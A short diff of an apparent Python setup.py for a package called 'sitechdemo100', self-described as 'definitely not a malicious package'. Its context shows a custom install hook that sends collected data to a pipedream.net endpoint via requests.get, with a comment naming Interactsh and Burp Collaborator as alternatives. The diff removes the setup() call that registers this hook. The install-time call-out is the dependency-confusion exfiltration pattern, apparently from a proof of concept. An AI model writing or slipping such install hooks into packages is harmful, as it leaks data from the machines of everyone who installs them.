@@ -16,11 +16,5 @@ class CustomInstall(install):
         requests.get("https://en0w6ukj0qarx.x.pipedream.net/",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='sitechdemo100', #package name
-      version='1337.0.0',
-      description='definitely not a malicious package',
-      author='AbuQasem',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                                                      
 
